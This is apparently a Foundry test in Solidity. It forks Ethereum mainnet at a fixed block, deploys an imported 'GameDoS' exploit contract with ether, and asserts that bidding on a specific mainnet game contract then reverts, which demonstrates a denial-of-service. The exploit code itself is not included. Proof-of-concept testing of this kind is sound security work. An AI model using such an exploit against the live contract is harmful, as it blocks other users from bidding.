pragma solidity ^0.8.0;

import {Test, console2} from "forge-std/Test.sol";
import {GameDoS, IGame} from "../src/GameDoS.sol";

contract GameDoSTest is Test {
    GameDoS exploit;
    address bob;
    function setUp() public {
        vm.createSelectFork(vm.rpcUrl('mainnet'), 19213957);
        bob = makeAddr("bob");
        vm.deal(bob, 1 ether);

    }
    function test_DoS() public {
        vm.startPrank(bob);
        exploit = new GameDoS{value: 0.1 ether}();
        vm.expectRevert("sent fee error: ether is not sent"); // expect DoS revert on makeBid
        IGame(0x52d69c67536f55EfEfe02941868e5e762538dBD6).makeBid{value: 0.05 ether}();
        vm.stopPrank();
    }
}